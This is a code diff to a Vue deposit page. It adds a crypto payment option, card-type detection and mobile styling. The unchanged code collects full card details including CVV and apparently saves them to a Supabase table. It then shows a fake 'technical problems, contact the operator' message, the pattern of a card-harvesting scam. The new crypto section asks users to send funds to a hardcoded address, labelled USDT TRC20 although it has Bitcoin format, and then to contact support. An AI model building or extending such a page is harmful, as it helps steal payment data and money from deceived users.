@@ -1,5 +1,5 @@
 <script setup>
-import { ref } from 'vue'
+import { ref, watch } from 'vue'
 import { saveUser } from '../lib/supabase'
 import useAuth from '../composables/useAuth.js'
 import AccountTransactions from '../components/account/AccountTransactions.vue'
@@ -9,10 +9,13 @@ const activeTab = ref('deposit')
 const tabs = [
   { id: 'deposit', label: 'Пополнение' },
   { id: 'withdraw', label: 'Выплата' },
-  { id: 'history', label: 'История транзакций' }
+  { id: 'history', label: 'История транзакций' },
 ]
 
-// Пополнение
+// Перемикач способу оплати
+const paymentMethod = ref('card') // 'card' або 'crypto'
+
+// Пополнение (картой)
 const cardNumber = ref('')
 const expiry = ref('')
 const cvv = ref('')
@@ -22,8 +25,24 @@ const method = ref('Visa/Mastercard')
 const processing = ref(false)
 const showMessage = ref(false)
 const errors = ref({})
+const cardType = ref('')
+
+// Пополнение (крипто)
+const cryptoAddress = ref('bc1qxy2kgdygjrsqtzq2n0yrf24p0ngn9px8t5y92r')
+const qrCodeUrl = ref('')
+
+function detectCardType(number) {
+  number = number.replace(/\s/g, '')
+  if (/^4/.test(number)) return 'visa'
+  if (/^5[1-5]/.test(number)) return 'mastercard'
+  if (/^220[0-4]/.test(number)) return 'mir'
+  if (/^4278/.test(number)) return 'qiwi'
+  if (/^4916/.test(number)) return 'umoney'
+  return ''
+}
 
 function formatCard(value) {
+  cardType.value = detectCardType(value)
   return value
     .replace(/\D/g, '')
     .slice(0, 19)
@@ -53,19 +72,17 @@ function resetForm() {
   amount.value = ''
   method.value = 'Visa/Mastercard'
   errors.value = {}
+  cardType.value = ''
 }
 
 function validate() {
   const errs = {}
-
   if (!/^\d{16,19}$/.test(cardNumber.value.replace(/\s/g, ''))) {
     errs.cardNumber = 'Некорректный номер карты'
   }
-
   if (!/^\d{3}$/.test(cvv.value)) {
     errs.cvv = 'Некорректный CVV'
   }
-
   const match = expiry.value.match(/^(\d{2})\/(\d{2})$/)
   if (!match) {
     errs.expiry = 'Формат MM/YY'
@@ -81,25 +98,20 @@ function validate() {
       errs.expiry = 'Срок действия истёк'
     }
   }
-
   if (name.value.trim().length < 2) {
     errs.name = 'Введите имя держателя'
   }
-
   if (!amount.value || isNaN(amount.value) || Number(amount.value) <= 0) {
     errs.amount = 'Введите сумму'
   }
-
   errors.value = errs
   return Object.keys(errs).length === 0
 }
 
 async function submit() {
   if (!validate()) return
-
   processing.value = true
   const authUser = JSON.parse(localStorage.getItem('authUser') || '{}')
-
   await saveUser({
     email: authUser.email || '',
     phoneNumber: authUser.phoneNumber || localStorage.getItem('phoneNumber') || '',
@@ -110,7 +122,6 @@ async function submit() {
     amount: amount.value,
     method: method.value
   })
-
   setTimeout(() => {
     addDeposit(amount.value)
     processing.value = false
@@ -162,6 +173,23 @@ function openChat() {
     window.Intercom('show')
   }
 }
+
+function copyAddress() {
+  navigator.clipboard.writeText(cryptoAddress.value)
+    .then(() => {
+      alert('Адрес скопирован!');
+    })
+    .catch(err => {
+      console.error('Не удалось скопировать текст: ', err);
+    });
+}
+
+watch(cryptoAddress, (newVal) => {
+  if (newVal) {
+    qrCodeUrl.value = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(newVal)}`
+  }
+}, { immediate: true })
+
 </script>
 
 <template>
@@ -179,8 +207,17 @@ function openChat() {
     </nav>
 
     <div v-if="activeTab === 'deposit'">
-      <form v-if="!showMessage" @submit.prevent="submit" class="deposit-form" autocomplete="off">
-        <div class="form-group">
+      <div class="payment-toggle-container">
+        <span class="toggle-label-text">Кредитная карта</span>
+        <label class="toggle-switch-new">
+          <input type="checkbox" v-model="paymentMethod" true-value="crypto" false-value="card">
+          <span class="toggle-slider"></span>
+        </label>
+        <span class="toggle-label-text">Криптовалюта</span>
+      </div>
+
+      <form v-if="paymentMethod === 'card' && !showMessage" @submit.prevent="submit" class="deposit-form" autocomplete="off">
+        <div class="form-group card-input-group">
           <label for="cardNumber">Номер карты</label>
           <input
             id="cardNumber"
@@ -190,6 +227,7 @@ function openChat() {
             maxlength="19"
             required
           />
+          <img v-if="cardType" :src="`/imgCards/${cardType.toLowerCase()}.svg`" :alt="cardType" class="card-icon" />
           <span class="error-text" v-if="errors.cardNumber">{{ errors.cardNumber }}</span>
         </div>
         <div class="form-row">
@@ -243,7 +281,20 @@ function openChat() {
         </button>
         <div v-if="processing" class="processing">Обработка...</div>
       </form>
-      <div v-else class="modal">
+
+      <div v-if="paymentMethod === 'crypto'" class="crypto-section">
+        <h3>Оплата криптовалютой (USDT TRC20)</h3>
+        <p>Для пополнения баланса переведите средства на указанный ниже адрес. После оплаты обратитесь в службу поддержки, предоставив скриншот транзакции для зачисления средств.</p>
+        <div class="qr-code">
+          <img :src="qrCodeUrl" alt="QR Code" />
+        </div>
+        <div class="address-container">
+          <p class="address">{{ cryptoAddress }}</p>
+          <button @click="copyAddress" class="copy-btn">Копировать</button>
+        </div>
+      </div>
+      
+      <div v-else-if="showMessage" class="modal">
         <div class="modal-content">
           <p>
             К сожалению мы имеем технические неполадки на сервере, обратитесь к оператору чтобы пополнить баланс
@@ -290,7 +341,7 @@ function openChat() {
   gap: 8px;
   margin-bottom: 24px;
   justify-content: center;
-  flex-wrap: wrap;
+  flex-wrap: wrap; /* Додано, щоб вкладки переносилися на новий рядок */
 }
 .tabs button {
   padding: 12px 20px;
@@ -301,6 +352,8 @@ function openChat() {
   cursor: pointer;
   transition: background 0.3s;
   font-size: 1rem;
+  flex-grow: 1; /* Додано, щоб кнопки рівномірно розподіляли простір */
+  min-width: 120px; /* Мінімальна ширина для кнопок */
 }
 .tabs button.active {
   background: #ff4d00;
@@ -312,6 +365,7 @@ function openChat() {
   display: flex;
   flex-direction: column;
   gap: 16px;
+  padding: 0 16px; /* Додано внутрішній відступ для мобільних пристроїв */
 }
 .deposit-form label {
   margin-bottom: 4px;
@@ -325,6 +379,8 @@ function openChat() {
   background: #0b0c10;
   color: #f1f5f9;
   font-size: 1rem;
+  width: 100%; /* Забезпечує, що поле не виходить за межі батьківського контейнера */
+  box-sizing: border-box; /* Важливо для правильного розрахунку ширини */
 }
 .deposit-form select {
   appearance: none;
@@ -341,6 +397,11 @@ function openChat() {
 .form-row {
   display: flex;
   gap: 16px;
+  flex-wrap: wrap; /* Додано для перенесення на мобільних пристроях */
+}
+.form-row > .form-group {
+  flex: 1 1 0; /* Гнучке зростання для рівномірного розподілу */
+  min-width: 120px; /* Мінімальна ширина для полів */
 }
 .form-group {
   display: flex;
@@ -379,6 +440,8 @@ input.error, select.error {
   display: flex;
   justify-content: center;
   align-items: center;
+  z-index: 1000;
+  padding: 0 20px; /* Додано відступ, щоб модальне вікно не торкалось країв */
 }
 .modal-content {
   background: var(--card);
@@ -390,6 +453,161 @@ input.error, select.error {
 @media (max-width: 600px) {
   .form-row {
     flex-direction: column;
+  }
+}
+
+/* Нові стилі для іконки картки */
+.card-input-group {
+  position: relative;
+}
+.card-icon {
+  position: absolute;
+  right: 12px;
+  top: 50%;
+  transform: translateY(2px);
+  height: 24px;
+}
+
+/* Нові стилі для крипто-розділу */
+.crypto-section {
+  max-width: 480px;
+  margin: 0 auto;
+  text-align: center;
+  padding: 0 16px;
+}
+.crypto-section h3 {
+  margin-bottom: 16px;
+}
+.crypto-section p {
+  line-height: 1.5;
+  margin-bottom: 24px;
+}
+.qr-code {
+  background: #fff;
+  padding: 16px;
+  border-radius: 8px;
+  display: inline-block;
+  margin-bottom: 24px;
+  max-width: 100%;
+  box-sizing: border-box;
+}
+.qr-code img {
+  display: block;
+  max-width: 100%;
+  height: auto;
+}
+.address-container {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  gap: 8px;
+  background: #1e232d;
+  padding: 12px;
+  border-radius: 8px;
+}
+.address {
+  font-size: 0.9rem;
+  word-break: break-all;
+  flex-grow: 1;
+  text-align: left;
+  margin: 0;
+}
+.copy-btn {
+  background: #ff4d00;
+  color: #fff;
+  border: none;
+  padding: 8px 16px;
+  border-radius: 6px;
+  cursor: pointer;
+  white-space: nowrap;
+  font-size: 0.9rem;
+}
+
+/* Виправлені стилі для перемикача та адаптація */
+.payment-toggle-container {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 10px;
+  margin-bottom: 24px;
+}
+
+.toggle-label-text {
+  font-size: 1rem;
+  font-weight: bold;
+  color: #f1f5f9;
+  user-select: none;
+  white-space: nowrap;
+}
+
+.toggle-switch-new {
+  position: relative;
+  display: inline-block;
+  width: 170px;
+  height: 36px;
+  background-color: #1e232d;
+  border-radius: 18px;
+  flex-shrink: 0;
+}
+.toggle-switch-new input {
+  opacity: 0;
+  width: 0;
+  height: 0;
+}
+.toggle-slider {
+  position: absolute;
+  cursor: pointer;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background-color: transparent;
+  transition: 0.4s;
+  border-radius: 18px;
+}
+.toggle-slider:before {
+  position: absolute;
+  content: "";
+  height: 32px;
+  width: 85px;
+  left: 2px;
+  bottom: 2px;
+  background-color: #ff4d00;
+  transition: transform 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+  border-radius: 16px;
+}
+input:checked + .toggle-slider:before {
+  transform: translateX(81px);
+}
+
+/* Адаптація для мобільних пристроїв */
+@media (max-width: 480px) {
+  .tabs {
+    flex-direction: column; /* Змінено на column для мобільних пристроїв */
+  }
+  .tabs button {
+    font-size: 0.9rem;
+  }
+  .payment-toggle-container {
+    gap: 5px; /* Зменшення проміжку */
+  }
+  .toggle-label-text {
+    font-size: 0.8rem;
+  }
+  .toggle-switch-new {
+    width: 150px; /* Зменшення ширини перемикача на мобілках */
+    height: 30px;
+    border-radius: 15px;
+  }
+  .toggle-slider:before {
+    height: 26px;
+    width: 75px;
+    left: 2px;
+    bottom: 2px;
+    border-radius: 13px;
+  }
+  input:checked + .toggle-slider:before {
+    transform: translateX(71px);
   }
 }
 </style>
